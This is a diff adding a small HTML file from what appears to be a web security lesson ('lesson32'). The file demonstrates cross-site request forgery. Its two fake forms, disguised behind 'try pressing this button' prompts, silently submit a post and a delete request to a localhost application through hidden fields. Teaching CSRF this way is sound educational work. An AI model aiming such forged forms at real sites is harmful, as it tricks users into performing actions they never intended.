@@ -1,0 +1,25 @@
+<!-- lesson32 でCSRF脆弱性を検証するためのファイルです -->
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+  <meta charset="UTF-8">
+  <title>偽物の投稿フォーム</title>
+</head>
+
+<body>
+<h1>偽物の投稿フォーム</h1>
+<form method="post" action="http://localhost:8000/posts">
+  <input type="hidden" name="content" value="まんまと罠にかかりましたね">
+  <button type="submit">ボタンを押してみてください</button>
+</form>
+
+<h1>偽物の削除フォーム</h1>
+<form method="post" action="http://localhost:8000/posts?delete=1">
+  <input type="hidden" name="id" value="10"></input>
+  <button type="submit">ボタンを押してみてください</button>
+</form>
+
+</body>
+
+</html>
